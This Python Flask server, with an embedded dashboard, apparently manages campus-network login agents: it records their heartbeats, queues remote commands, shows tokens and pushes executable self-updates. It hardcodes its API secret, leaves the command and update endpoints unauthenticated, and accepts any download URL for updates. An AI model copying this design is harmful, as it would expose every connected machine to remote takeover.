#!/usr/bin/env python3
"""
校园网远程控制面板 - Server
功能: 查看所有 Agent 状态、远程下线/登录、查看 token
      持久化存储: 历史 Agent、命令记录均保存到磁盘
"""
import json, time, uuid, os, threading, hashlib
from flask import Flask, request, jsonify, Response

app = Flask(__name__)

# API 鉴权密钥 (必须与 Agent 一致)
API_SECRET = "CampusNet@2026#Secure"
AUTH_TOLERANCE = 300  # 时间戳容差(秒)

def _verify_auth():
    """验证 Agent API 请求签名"""
    ts = request.headers.get("X-Auth-Ts", "")
    sig = request.headers.get("X-Auth-Sig", "")
    if not ts or not sig:
        return False
    try:
        if abs(time.time() - int(ts)) > AUTH_TOLERANCE:
            return False
    except:
        return False
    body = request.get_data(as_text=True)
    expected = hashlib.sha256(f"{API_SECRET}:{ts}:{body[:64]}".encode()).hexdigest()[:16]
    return sig == expected

# ============ 持久化存储 ============
DATA_DIR = os.path.dirname(os.path.abspath(__file__))
AGENTS_FILE = os.path.join(DATA_DIR, "server_agents.json")
HISTORY_FILE = os.path.join(DATA_DIR, "server_history.json")

agents = {}      # agent_id -> {状态信息}
commands = {}    # agent_id -> [待执行命令列表]
history = []     # [{time, agent_id, hostname, action, detail, success}]
blacklist = set() # 被删除的 agent_id，拒绝重连
lock = threading.Lock()
BLACKLIST_FILE = os.path.join(DATA_DIR, "server_blacklist.json")

def _load_data():
    global agents, history, blacklist
    if os.path.exists(AGENTS_FILE):
        try:
            with open(AGENTS_FILE, "r", encoding="utf-8") as f:
                agents.update(json.load(f))
            print(f"  [DATA] 已加载 {len(agents)} 个历史 Agent")
        except: pass
    if os.path.exists(HISTORY_FILE):
        try:
            with open(HISTORY_FILE, "r", encoding="utf-8") as f:
                history.extend(json.load(f))
            print(f"  [DATA] 已加载 {len(history)} 条历史记录")
        except: pass
    if os.path.exists(BLACKLIST_FILE):
        try:
            with open(BLACKLIST_FILE, "r", encoding="utf-8") as f:
                blacklist.update(json.load(f))
            print(f"  [DATA] 已加载 {len(blacklist)} 个黑名单 Agent")
        except: pass

def _save_blacklist():
    try:
        with open(BLACKLIST_FILE, "w", encoding="utf-8") as f:
            json.dump(list(blacklist), f)
    except: pass

def _save_agents():
    try:
        with open(AGENTS_FILE, "w", encoding="utf-8") as f:
            json.dump(agents, f, ensure_ascii=False, indent=2)
    except: pass

def _save_history():
    try:
        with open(HISTORY_FILE, "w", encoding="utf-8") as f:
            json.dump(history[-500:], f, ensure_ascii=False, indent=2)
    except: pass

def _add_history(agent_id, action, detail="", success=None):
    hostname = agents.get(agent_id, {}).get("hostname", agent_id[:8])
    entry = {
        "time": time.time(),
        "agent_id": agent_id,
        "hostname": hostname,
        "action": action,
        "detail": detail,
        "success": success,
    }
    history.append(entry)
    if len(history) > 500:
        del history[:-500]
    _save_history()

# ============ API: Agent 端 ============

@app.route("/api/heartbeat", methods=["POST"])
def heartbeat():
    """Agent 定时心跳上报"""
    if not _verify_auth():
        return jsonify({"error": "auth failed"}), 403
    data = request.json or {}
    aid = data.get("agent_id")
    if not aid:
        return jsonify({"error": "no agent_id"}), 400
    if aid in blacklist:
        return jsonify({"error": "blocked", "commands": [{"id": "blk", "command": "exit"}]}), 403
    with lock:
        is_new = aid not in agents
        was_alive = agents.get(aid, {}).get("alive", False)
        agents[aid] = {**data, "last_seen": time.time(), "alive": True}
        pending = commands.pop(aid, [])
        _save_agents()
        if is_new:
            _add_history(aid, "首次连接", f"主机: {data.get('hostname','')} IP: {data.get('local_ip','')}")
        elif not was_alive:
            _add_history(aid, "重新上线", f"IP: {data.get('local_ip','')}")
    return jsonify({"commands": pending})

@app.route("/api/report", methods=["POST"])
def report():
    """Agent 回报命令执行结果"""
    if not _verify_auth():
        return jsonify({"error": "auth failed"}), 403
    data = request.json or {}
    cid = data.get("cmd_id")
    aid = data.get("agent_id", "")
    if cid:
        with lock:
            _add_history(aid, f"命令结果", data.get("message", ""), data.get("success"))
    return jsonify({"ok": True})

# ============ API: Web 面板 ============

@app.route("/api/delete_agent", methods=["POST"])
def delete_agent():
    """删除 Agent 并加入黑名单"""
    data = request.json or {}
    aid = data.get("agent_id")
    block = data.get("block", True)
    if not aid:
        return jsonify({"error": "missing agent_id"}), 400
    with lock:
        hostname = agents.get(aid, {}).get("hostname", aid[:8])
        agents.pop(aid, None)
        commands.pop(aid, None)
        _save_agents()
        if block:
            blacklist.add(aid)
            _save_blacklist()
        _add_history(aid, "删除设备" + ("+拉黑" if block else ""), f"主机: {hostname}")
    return jsonify({"ok": True})

@app.route("/api/unblock_agent", methods=["POST"])
def unblock_agent():
    """解除黑名单"""
    data = request.json or {}
    aid = data.get("agent_id")
    if not aid:
        return jsonify({"error": "missing agent_id"}), 400
    with lock:
        blacklist.discard(aid)
        _save_blacklist()
        _add_history(aid, "解除黑名单")
    return jsonify({"ok": True})

@app.route("/api/agents")
def get_agents():
    now = time.time()
    result = []
    with lock:
        for aid, d in agents.items():
            item = dict(d)
            last = d.get("last_seen", 0)
            dt = now - last
            if dt > 30:
                item["alive"] = False
                if dt > 300:
                    item["status_text"] = "离线"
                    item["status_cls"] = "off"
                else:
                    item["status_text"] = "失联"
                    item["status_cls"] = "aw"
            else:
                item["alive"] = True
                item["status_text"] = "在线" if d.get("net_online") else "已连接(未认证)"
                item["status_cls"] = "on" if d.get("net_online") else "aw"
            result.append(item)
    result.sort(key=lambda x: (0 if x.get("alive") else 1, x.get("hostname", x.get("agent_id", ""))))
    return jsonify(result)

@app.route("/api/command", methods=["POST"])
def send_command():
    """面板下发命令给 Agent"""
    data = request.json or {}
    aid = data.get("agent_id")
    cmd = data.get("command")
    if not aid or not cmd:
        return jsonify({"error": "missing agent_id or command"}), 400
    cid = str(uuid.uuid4())[:8]
    with lock:
        commands.setdefault(aid, []).append({
            "id": cid,
            "command": cmd,
            "params": data.get("params", {}),
            "time": time.time(),
        })
        _add_history(aid, f"下发命令: {cmd}", json.dumps(data.get("params", {}), ensure_ascii=False))
    return jsonify({"ok": True, "cmd_id": cid})

@app.route("/api/history")
def get_history():
    """获取操作历史"""
    n = request.args.get("n", 100, type=int)
    with lock:
        items = history[-n:]
    items.reverse()
    return jsonify(items)

# ============ 远程更新: 文件托管 + 版本缓存 ============
UPLOAD_DIR = os.path.join(DATA_DIR, "uploads")
RELEASE_DIR = os.path.join(DATA_DIR, "release")
MAX_CACHED_VERSIONS = 3  # 最多缓存版本数
os.makedirs(UPLOAD_DIR, exist_ok=True)

def _get_current_version():
    """从 agent.py 读取当前版本号"""
    try:
        with open(os.path.join(DATA_DIR, "agent.py"), "r", encoding="utf-8") as f:
            for line in f:
                if "AGENT_VERSION" in line and "=" in line:
                    return line.split("=")[1].strip().strip('"').strip("'").split("#")[0].strip().strip('"').strip("'")
    except: pass
    return ""

def _list_cached_exes():
    """列出 uploads 目录中所有版本化 exe, 返回 [{version, filename, size_mb, mtime}] 按时间倒序"""
    import glob
    result = []
    for fp in glob.glob(os.path.join(UPLOAD_DIR, "CampusNetAgent_v*.exe")):
        fn = os.path.basename(fp)
        # CampusNetAgent_v1.5.exe → "1.5"
        ver = fn.replace("CampusNetAgent_v", "").replace(".exe", "")
        result.append({
            "version": ver,
            "filename": fn,
            "size_mb": round(os.path.getsize(fp) / 1024 / 1024, 1),
            "mtime": os.path.getmtime(fp),
        })
    result.sort(key=lambda x: -x["mtime"])
    return result

def _cleanup_old_versions():
    """保留最新 MAX_CACHED_VERSIONS 个版本, 删除多余的"""
    cached = _list_cached_exes()
    if len(cached) > MAX_CACHED_VERSIONS:
        for old in cached[MAX_CACHED_VERSIONS:]:
            try:
                os.remove(os.path.join(UPLOAD_DIR, old["filename"]))
                print(f"  [CACHE] 清理旧版本: {old['filename']}")
            except: pass

def _cache_exe(src_path, version):
    """将 exe 存为版本化文件, 同时更新 latest 软链接"""
    import shutil
    if not version:
        return
    versioned = os.path.join(UPLOAD_DIR, f"CampusNetAgent_v{version}.exe")
    latest = os.path.join(UPLOAD_DIR, "CampusNetAgent.exe")
    shutil.copy2(src_path, versioned)
    os.chmod(versioned, 0o644)
    # 更新 latest
    try:
        if os.path.islink(latest) or os.path.exists(latest):
            os.remove(latest)
        shutil.copy2(versioned, latest)
        os.chmod(latest, 0o644)
    except: pass
    _cleanup_old_versions()

def _sync_release_exe():
    """启动时自动从 release/ 目录同步 exe 到 uploads/"""
    release_exe = os.path.join(RELEASE_DIR, "CampusNetAgent.exe")
    if not os.path.exists(release_exe):
        return
    version = _get_current_version()
    if not version:
        return
    versioned = os.path.join(UPLOAD_DIR, f"CampusNetAgent_v{version}.exe")
    # 只在版本文件不存在或 release 更新时同步
    if os.path.exists(versioned) and os.path.getmtime(versioned) >= os.path.getmtime(release_exe):
        return
    print(f"  [SYNC] 从 release/ 同步 exe → v{version}")
    _cache_exe(release_exe, version)

# 启动时自动同步
_sync_release_exe()

@app.route("/api/upload_exe", methods=["POST"])
def upload_exe():
    """上传新版本 exe (面板操作)"""
    f = request.files.get("file")
    if not f:
        return jsonify({"error": "no file"}), 400
    version = request.form.get("version", "") or _get_current_version()
    # 先保存到临时位置
    tmp_path = os.path.join(UPLOAD_DIR, "_tmp_upload.exe")
    f.save(tmp_path)
    size_mb = os.path.getsize(tmp_path) / 1024 / 1024
    # 版本化缓存
    _cache_exe(tmp_path, version)
    try: os.remove(tmp_path)
    except: pass
    _add_history("server", "上传新版本", f"v{version} ({size_mb:.1f}MB)")
    return jsonify({"ok": True, "version": version, "size_mb": round(size_mb, 1),
                    "url": f"/download/CampusNetAgent_v{version}.exe"})

@app.route("/download/<path:filename>")
def download_file(filename):
    """提供 exe 下载 (Agent 自更新拉取)"""
    from flask import send_from_directory
    return send_from_directory(UPLOAD_DIR, filename)

@app.route("/api/versions")
def get_versions():
    """获取可用版本列表 (git log + 本地缓存)"""
    import subprocess as _sp
    versions = []
    try:
        r = _sp.run(["git", "log", "--oneline", "-20"],
                     capture_output=True, text=True, timeout=5, cwd=DATA_DIR)
        if r.returncode == 0:
            import re as _re
            for line in r.stdout.strip().split("\n"):
                if not line.strip():
                    continue
                sha = line.split()[0]
                msg = line[len(sha):].strip()
                ver_match = _re.search(r'v(\d+\.\d+(?:\.\d+)?)', msg)
                ver = ver_match.group(1) if ver_match else ""
                versions.append({"sha": sha, "msg": msg, "version": ver})
    except: pass
    current = _get_current_version()
    cached = _list_cached_exes()
    return jsonify({
        "versions": versions,
        "current": current,
        "cached_exes": cached,
        "has_exe": bool(cached),
        "exe_size_mb": cached[0]["size_mb"] if cached else 0,
        "exe_time": round(cached[0]["mtime"]) if cached else 0,
    })

@app.route("/api/push_update", methods=["POST"])
def push_update():
    """向指定 Agent(s) 推送更新命令"""
    data = request.json or {}
    target = data.get("agents", [])  # agent_id 列表, 空=全部在线
    version = data.get("version", "")
    
    # 查找对应版本的 exe
    exe_path = None
    if version:
        versioned = os.path.join(UPLOAD_DIR, f"CampusNetAgent_v{version}.exe")
        if os.path.exists(versioned):
            exe_path = versioned
    if not exe_path:
        # 回退到最新缓存
        cached = _list_cached_exes()
        if cached:
            exe_path = os.path.join(UPLOAD_DIR, cached[0]["filename"])
    if not exe_path:
        fallback = os.path.join(UPLOAD_DIR, "CampusNetAgent.exe")
        if os.path.exists(fallback):
            exe_path = fallback
    if not exe_path:
        return jsonify({"error": "未上传任何版本的 exe"}), 400
    
    exe_filename = os.path.basename(exe_path)
    # 使用 nginx 转发的真实 Host, 并加上 /gyk 前缀
    host = request.headers.get("X-Forwarded-Host", request.headers.get("Host", request.host))
    scheme = request.headers.get("X-Forwarded-Proto", request.scheme)
    prefix = "/gyk" if "yuanai.best" in host else ""
    download_url = data.get("url", f"{scheme}://{host}{prefix}/download/{exe_filename}")
    
    count = 0
    skipped = 0
    with lock:
        targets = target if target else [aid for aid, d in agents.items()
                                         if d.get("alive") and (time.time() - d.get("last_seen", 0)) < 30]
        for aid in targets:
            if version and agents.get(aid, {}).get("version") == version:
                skipped += 1
                continue
            cid = str(uuid.uuid4())[:8]
            commands.setdefault(aid, []).append({
                "id": cid,
                "command": "self_update",
                "params": {"url": download_url, "version": version},
                "time": time.time(),
            })
            count += 1
        _add_history("server", f"推送更新 v{version}", f"推送: {count} 个, 跳过: {skipped} 个(已是最新)")
    return jsonify({"ok": True, "count": count, "skipped": skipped})

# ============ Web 面板 ============

@app.route("/")
def dashboard():
    return Response(HTML_PAGE, content_type="text/html; charset=utf-8")

HTML_PAGE = r"""<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Agent 远程控制中心</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
:root{
  --bg:#f3f4f8;--card:#fff;--text:#0f172a;--text-2:#334155;--muted:#64748b;--sub:#94a3b8;
  --border:#e5e7eb;--border-2:#f1f5f9;
  --primary:#6366f1;--primary-2:#4f46e5;
  --green:#10b981;--green-bg:#ecfdf5;--green-text:#047857;
  --red:#ef4444;--red-bg:#fef2f2;--red-text:#b91c1c;
  --orange:#f59e0b;--orange-bg:#fffbeb;--orange-text:#b45309;
  --blue:#3b82f6;--blue-bg:#eff6ff;--blue-text:#1d4ed8;
  --purple:#8b5cf6;--purple-bg:#f5f3ff;--purple-text:#6d28d9;
  --slate-bg:#f8fafc;
  --shadow-sm:0 1px 2px rgba(15,23,42,.04),0 1px 3px rgba(15,23,42,.06);
  --shadow-md:0 4px 12px rgba(15,23,42,.07),0 2px 4px rgba(15,23,42,.04);
  --shadow-lg:0 20px 50px rgba(15,23,42,.22);
}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,'PingFang SC','Microsoft YaHei',sans-serif;background:var(--bg);color:var(--text);min-height:100vh;font-size:14px;line-height:1.5}
.topbar{background:linear-gradient(120deg,#4f46e5 0%,#7c3aed 50%,#ec4899 100%);color:#fff;padding:18px 28px;display:flex;align-items:center;justify-content:space-between;box-shadow:0 2px 12px rgba(79,70,229,.3);position:sticky;top:0;z-index:50}
.brand{display:flex;align-items:center;gap:12px}
.brand .logo{font-size:28px}
.brand h1{font-size:20px;font-weight:700;letter-spacing:.3px}
.brand .sub{font-size:12px;opacity:.8;margin-left:8px;padding:2px 10px;background:rgba(255,255,255,.15);border-radius:20px}
.top-actions{display:flex;align-items:center;gap:14px;font-size:13px}
.top-actions .clock{opacity:.9;font-variant-numeric:tabular-nums}
.btn-ghost-top{background:rgba(255,255,255,.18);color:#fff;border:1px solid rgba(255,255,255,.25);padding:7px 14px;border-radius:8px;font-size:12px;cursor:pointer;transition:.15s;font-weight:500}
.btn-ghost-top:hover{background:rgba(255,255,255,.28)}
.container{max-width:1280px;margin:0 auto;padding:24px}
.stats-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(170px,1fr));gap:14px;margin-bottom:24px}
.stat{background:var(--card);border-radius:14px;padding:18px 20px;box-shadow:var(--shadow-sm);border:1px solid var(--border-2);display:flex;flex-direction:column;gap:4px;position:relative;overflow:hidden}
.stat::before{content:"";position:absolute;top:0;left:0;right:0;height:3px;background:var(--muted)}
.stat-total::before{background:var(--primary)}.stat-on::before{background:var(--green)}.stat-off::before{background:var(--red)}.stat-aw::before{background:var(--orange)}
.stat-num{font-size:28px;font-weight:700;letter-spacing:-.5px}
.stat-total .stat-num{color:var(--primary)}.stat-on .stat-num{color:var(--green)}.stat-off .stat-num{color:var(--red)}.stat-aw .stat-num{color:var(--orange)}
.stat-label{font-size:12px;color:var(--muted);font-weight:500}
.panel{background:var(--card);border-radius:14px;box-shadow:var(--shadow-sm);border:1px solid var(--border-2);margin-bottom:22px;overflow:hidden}
.panel-head{display:flex;align-items:center;justify-content:space-between;padding:14px 20px;border-bottom:1px solid var(--border-2);gap:12px;flex-wrap:wrap}
.panel-head h2{font-size:15px;font-weight:600;display:flex;align-items:center;gap:8px}
.panel-tools{display:flex;align-items:center;gap:10px;flex-wrap:wrap}
.search{background:var(--slate-bg);border:1px solid var(--border);padding:7px 12px;border-radius:8px;font-size:13px;width:220px;outline:none;transition:.15s}
.search:focus{border-color:var(--primary);background:#fff;box-shadow:0 0 0 3px rgba(99,102,241,.1)}
.device-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:14px;padding:18px}
.device-card{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:16px;cursor:pointer;transition:all .18s;position:relative}
.device-card:hover{border-color:var(--primary);transform:translateY(-2px);box-shadow:var(--shadow-md)}
.device-card.on{border-left:3px solid var(--green)}
.device-card.off{border-left:3px solid var(--red)}
.device-card.aw{border-left:3px solid var(--orange)}
.card-top{display:flex;justify-content:space-between;align-items:center;margin-bottom:8px}
.card-title{display:flex;align-items:center;gap:8px;min-width:0;flex:1}
.card-title .name{font-weight:600;font-size:14px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.card-title .dot{width:8px;height:8px;border-radius:50%;flex-shrink:0}
.device-card.on .dot{background:var(--green);box-shadow:0 0 0 3px rgba(16,185,129,.18)}
.device-card.off .dot{background:var(--red)}
.device-card.aw .dot{background:var(--orange)}
.badge{font-size:11px;padding:2px 8px;border-radius:20px;font-weight:500;white-space:nowrap}
.badge.on{background:var(--green-bg);color:var(--green-text)}
.badge.off{background:var(--red-bg);color:var(--red-text)}
.badge.aw{background:var(--orange-bg);color:var(--orange-text)}
.card-user{font-size:12px;color:var(--text-2);margin-bottom:8px;font-weight:500;min-height:18px}
.card-meta{display:flex;gap:10px;font-size:11px;color:var(--muted);margin-bottom:10px;font-family:'SF Mono',Consolas,monospace}
.card-flags{display:flex;flex-wrap:wrap;gap:4px;margin-bottom:10px;min-height:20px}
.flag{font-size:10px;padding:2px 7px;border-radius:10px;font-weight:500}
.flag-ok{background:var(--green-bg);color:var(--green-text)}
.flag-warn{background:var(--orange-bg);color:var(--orange-text)}
.flag-danger{background:var(--red-bg);color:var(--red-text)}
.flag-info{background:var(--blue-bg);color:var(--blue-text)}
.flag-muted{background:var(--slate-bg);color:var(--muted)}
.card-foot{display:flex;justify-content:space-between;font-size:11px;color:var(--sub);border-top:1px solid var(--border-2);padding-top:8px;margin-top:2px}
.card-empty{text-align:center;color:var(--sub);padding:60px 20px;font-size:14px;grid-column:1/-1}
.log-tabs{display:flex;gap:4px;background:var(--slate-bg);padding:4px;border-radius:10px}
.tab{background:transparent;border:none;padding:6px 14px;font-size:12px;font-weight:500;border-radius:7px;cursor:pointer;color:var(--muted);transition:.15s}
.tab:hover{color:var(--text)}
.tab.active{background:#fff;color:var(--primary);box-shadow:0 1px 3px rgba(0,0,0,.08)}
.log-filters{display:flex;gap:10px;padding:12px 20px;align-items:center;flex-wrap:wrap;border-bottom:1px solid var(--border-2);background:var(--slate-bg)}
.chip{background:#fff;border:1px solid var(--border);padding:6px 12px;border-radius:20px;font-size:12px;cursor:pointer;transition:.15s;font-weight:500;color:var(--text-2)}
.chip:hover{border-color:var(--primary);color:var(--primary)}
.log-hint{font-size:11px;color:var(--sub);margin-left:auto}
.log-filter-panel{padding:12px 20px;background:var(--slate-bg);border-bottom:1px solid var(--border-2)}
.filter-head{display:flex;gap:8px;margin-bottom:10px}
.btn-mini{background:#fff;border:1px solid var(--border);padding:4px 10px;border-radius:6px;font-size:11px;cursor:pointer;color:var(--text-2)}
.btn-mini:hover{border-color:var(--primary);color:var(--primary)}
.filter-list{display:grid;grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:6px;max-height:180px;overflow-y:auto}
.filter-item{display:flex;align-items:center;gap:6px;font-size:12px;padding:4px 8px;border-radius:6px;cursor:pointer;color:var(--text-2)}
.filter-item:hover{background:#fff}
.log-box{max-height:420px;overflow-y:auto;padding:4px 0;background:#fff;font-family:'SF Mono',Consolas,monospace;font-size:12px}
.log-row{padding:8px 20px;border-bottom:1px solid var(--border-2);display:flex;gap:10px;align-items:flex-start}
.log-row:hover{background:var(--slate-bg)}
.log-row .ic{flex-shrink:0}
.log-row .tm{color:var(--sub);font-size:10px;min-width:130px;flex-shrink:0}
.log-row .host{color:var(--primary);font-weight:600;min-width:110px;flex-shrink:0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.log-row .act{color:var(--text);flex:1;word-break:break-all}
.log-row.ok .ic{color:var(--green)}
.log-row.err .ic{color:var(--red)}
.log-row .detail{color:var(--muted);font-size:11px;margin-left:4px}
.log-empty{text-align:center;color:var(--sub);padding:50px 20px;font-size:13px}
.drawer-backdrop{display:none;position:fixed;inset:0;background:rgba(15,23,42,.45);z-index:100;animation:fadeIn .2s ease}
.drawer-backdrop.show{display:block}
.drawer{position:fixed;top:0;right:-520px;width:500px;max-width:100vw;height:100vh;background:#fff;z-index:101;transition:right .28s cubic-bezier(.22,.61,.36,1);box-shadow:var(--shadow-lg);display:flex;flex-direction:column}
.drawer.show{right:0}
.drawer-head{padding:20px 24px;border-bottom:1px solid var(--border);display:flex;justify-content:space-between;align-items:flex-start;gap:12px;background:linear-gradient(135deg,#fafbff 0%,#f0f2fe 100%)}
.drawer-head h3{font-size:18px;font-weight:700;margin-bottom:4px;word-break:break-all}
.drawer-sub{font-size:12px;color:var(--muted);display:flex;align-items:center;gap:8px;flex-wrap:wrap}
.btn-close{background:transparent;border:none;font-size:20px;cursor:pointer;color:var(--muted);width:32px;height:32px;border-radius:8px;display:flex;align-items:center;justify-content:center;flex-shrink:0}
.btn-close:hover{background:var(--slate-bg);color:var(--text)}
.drawer-body{flex:1;overflow-y:auto;padding:20px 24px}
.info-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px 18px;padding:14px 16px;background:var(--slate-bg);border-radius:10px;margin-bottom:18px;border:1px solid var(--border-2)}
.info-grid .ig-row{display:flex;justify-content:space-between;align-items:center;font-size:12px;grid-column:span 2;padding:3px 0}
.info-grid .ig-row.half{grid-column:span 1}
.info-grid .ig-k{color:var(--muted)}
.info-grid .ig-v{font-family:'SF Mono',Consolas,monospace;color:var(--text);font-weight:500;text-align:right;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;max-width:60%}
.info-grid .ig-v.good{color:var(--green-text)}
.info-grid .ig-v.bad{color:var(--red-text)}
.info-grid .ig-v.warn{color:var(--orange-text)}
.action-group{margin-bottom:18px}
.group-title{font-size:12px;font-weight:600;color:var(--muted);text-transform:uppercase;letter-spacing:.5px;margin-bottom:10px}
.action-row{display:flex;flex-wrap:wrap;gap:8px}
.btn{border:1px solid transparent;padding:8px 14px;border-radius:8px;font-size:12px;font-weight:500;cursor:pointer;transition:all .15s;background:var(--slate-bg);color:var(--text-2)}
.btn:hover{transform:translateY(-1px);box-shadow:var(--shadow-sm)}
.btn-primary{background:var(--primary);color:#fff}
.btn-primary:hover{background:var(--primary-2)}
.btn-ghost{background:transparent;border:1px solid var(--border);color:var(--text-2)}
.btn-ghost:hover{background:var(--slate-bg)}
.btn-red{background:var(--red-bg);color:var(--red-text)}
.btn-red:hover{background:var(--red);color:#fff}
.btn-blue{background:var(--blue-bg);color:var(--blue-text)}
.btn-blue:hover{background:var(--blue);color:#fff}
.btn-green{background:var(--green-bg);color:var(--green-text)}
.btn-green:hover{background:var(--green);color:#fff}
.btn-orange{background:var(--orange-bg);color:var(--orange-text)}
.btn-orange:hover{background:var(--orange);color:#fff}
.btn-purple{background:var(--purple-bg);color:var(--purple-text)}
.btn-purple:hover{background:var(--purple);color:#fff}
.btn-dark{background:#0f172a;color:#fff}
.btn-dark:hover{background:#1e293b}
.autostart-toggle{display:flex;align-items:center;justify-content:space-between;padding:10px 12px;background:var(--slate-bg);border-radius:8px;margin-bottom:8px}
.autostart-toggle .label{font-size:13px;color:var(--text)}
.autostart-toggle .hint{font-size:11px;color:var(--sub);margin-top:2px}
.toggle{position:relative;width:44px;height:24px;cursor:pointer;flex-shrink:0}
.toggle input{opacity:0;width:0;height:0}
.toggle .slider{position:absolute;inset:0;background:#cbd5e1;border-radius:24px;transition:.3s}
.toggle .slider::before{content:"";position:absolute;width:18px;height:18px;left:3px;bottom:3px;background:#fff;border-radius:50%;transition:.3s;box-shadow:0 1px 3px rgba(0,0,0,.2)}
.toggle input:checked+.slider{background:var(--green)}
.toggle input:checked+.slider::before{transform:translateX(20px)}
.token-section{background:var(--slate-bg);padding:12px 14px;border-radius:10px;margin-top:16px;border:1px dashed var(--border)}
.token-section .label{font-size:11px;color:var(--muted);margin-bottom:6px;font-weight:600}
.token-section .val{font-family:'SF Mono',Consolas,monospace;font-size:11px;color:var(--text-2);word-break:break-all;max-height:100px;overflow-y:auto}
.modal-overlay{display:none;position:fixed;inset:0;background:rgba(15,23,42,.55);z-index:200;align-items:center;justify-content:center;animation:fadeIn .2s}
.modal-overlay.show{display:flex}
.modal{background:#fff;border-radius:16px;padding:24px;max-width:420px;width:92%;box-shadow:var(--shadow-lg)}
.modal h3{font-size:17px;font-weight:600;margin-bottom:12px}
.modal-msg{font-size:13px;color:var(--text-2);margin-bottom:14px;line-height:1.6}
.modal-msg b{color:var(--text);font-weight:600}
.modal-warn{color:var(--orange-text);background:var(--orange-bg);padding:8px 12px;border-radius:8px;font-size:12px;margin-bottom:16px;font-weight:500}
.modal-btns{display:flex;gap:10px;justify-content:flex-end}
.modal-btns .btn{padding:9px 20px;font-size:13px}
.mdl-input{width:100%;padding:8px 12px;border-radius:8px;border:1px solid var(--border);font-size:13px;margin-top:6px;outline:none}
.mdl-input:focus{border-color:var(--primary);box-shadow:0 0 0 3px rgba(99,102,241,.1)}
.mdl-select{width:100%;padding:8px 12px;border-radius:8px;border:1px solid var(--border);font-size:13px;margin-top:6px;background:#fff;cursor:pointer;outline:none}
.mdl-label{font-size:12px;color:var(--text-2);font-weight:500}
@keyframes fadeIn{from{opacity:0}to{opacity:1}}
@media(max-width:640px){.topbar{padding:14px 16px;flex-direction:column;align-items:flex-start;gap:10px}.container{padding:16px}.drawer{width:100vw;right:-100vw}.search{width:160px}.info-grid{grid-template-columns:1fr}.info-grid .ig-row.half{grid-column:span 2}}
</style>
</head>
<body>
<header class="topbar">
  <div class="brand">
    <span class="logo">🥤</span>
    <h1>Agent 远程控制中心</h1>
  </div>
  <div class="top-actions">
    <span class="clock" id="clock"></span>
    <button class="btn-ghost-top" onclick="openBatchUpdate()">📦 批量推送更新</button>
  </div>
</header>

<main class="container">
  <section class="stats-grid">
    <div class="stat stat-total"><div class="stat-num" id="totalCnt">0</div><div class="stat-label">总设备</div></div>
    <div class="stat stat-on"><div class="stat-num" id="onlineCnt">0</div><div class="stat-label">在线</div></div>
    <div class="stat stat-off"><div class="stat-num" id="offlineCnt">0</div><div class="stat-label">离线</div></div>
    <div class="stat stat-aw"><div class="stat-num" id="awayCnt">0</div><div class="stat-label">失联</div></div>
  </section>

  <section class="panel">
    <div class="panel-head">
      <h2>📡 设备列表 <span style="font-size:11px;color:var(--sub);font-weight:400">点击任一设备查看详情</span></h2>
      <div class="panel-tools">
        <input class="search" id="deviceSearch" placeholder="搜索主机/姓名/IP" oninput="renderAgents()">
      </div>
    </div>
    <div class="device-grid" id="agentGrid"><div class="card-empty">加载中...</div></div>
  </section>

  <section class="panel">
    <div class="panel-head">
      <h2>📋 日志中心</h2>
      <div class="panel-tools">
        <div class="log-tabs">
          <button class="tab active" data-kind="all" onclick="setLogTab('all')">全部</button>
          <button class="tab" data-kind="cmd" onclick="setLogTab('cmd')">命令下发</button>
          <button class="tab" data-kind="result" onclick="setLogTab('result')">命令结果</button>
          <button class="tab" data-kind="conn" onclick="setLogTab('conn')">连接事件</button>
          <button class="tab" data-kind="sys" onclick="setLogTab('sys')">系统/更新</button>
        </div>
      </div>
    </div>
    <div class="log-filters">
      <button class="chip" onclick="toggleLogFilterPanel()" id="filterBtn">🎯 按设备筛选: 全部</button>
      <input class="search" id="logSearch" placeholder="搜索日志关键词..." oninput="renderLogs()" style="width:260px">
      <span class="log-hint">实时 <span id="sessLogCount">0</span> · 历史 <span id="histLogCount">0</span></span>
    </div>
    <div class="log-filter-panel" id="logFilterPanel" style="display:none">
      <div class="filter-head">
        <button class="btn-mini" onclick="selectAllDevices(true)">全选</button>
        <button class="btn-mini" onclick="selectAllDevices(false)">清空</button>
        <span style="font-size:11px;color:var(--sub);margin-left:auto">勾选要查看日志的设备</span>
      </div>
      <div class="filter-list" id="logFilterList"></div>
    </div>
    <div class="log-box" id="logBox"><div class="log-empty">加载中...</div></div>
  </section>
</main>

<div class="drawer-backdrop" id="drawerBackdrop" onclick="closeDrawer()"></div>
<aside class="drawer" id="agentDrawer">
  <div class="drawer-head">
    <div style="flex:1;min-width:0">
      <h3 id="drawerName">--</h3>
      <div class="drawer-sub" id="drawerSub">--</div>
    </div>
    <button class="btn-close" onclick="closeDrawer()">✕</button>
  </div>
  <div class="drawer-body" id="drawerBody"></div>
</aside>

<div class="modal-overlay" id="confirmModal">
  <div class="modal">
    <h3 id="modalTitle">确认操作</h3>
    <div class="modal-msg" id="modalMsg"></div>
    <p class="modal-warn" id="modalWarn">❗ 请再次确认执行此操作</p>
    <div class="modal-btns">
      <button class="btn btn-ghost" onclick="closeModal()">取消</button>
      <button class="btn btn-primary" onclick="confirmAction()">确认执行</button>
    </div>
  </div>
</div>
<script>
const API=(location.pathname.startsWith("/gyk")?"/gyk":"");
let _agents=[],_history=[],_sessionLogs=[],_currentAgentId=null,_logTab="all",_logDeviceFilter=new Set(),pendingAction=null;

function ago(t){if(!t)return"--";const s=Math.floor(Date.now()/1000-t);if(s<5)return"刚刚";if(s<60)return s+"秒前";if(s<3600)return Math.floor(s/60)+"分钟前";return Math.floor(s/3600)+"小时前";}
function fmtTime(t){if(!t)return"";const d=new Date(t*1000);return d.toLocaleString("zh-CN",{hour12:false,month:"2-digit",day:"2-digit",hour:"2-digit",minute:"2-digit",second:"2-digit"});}
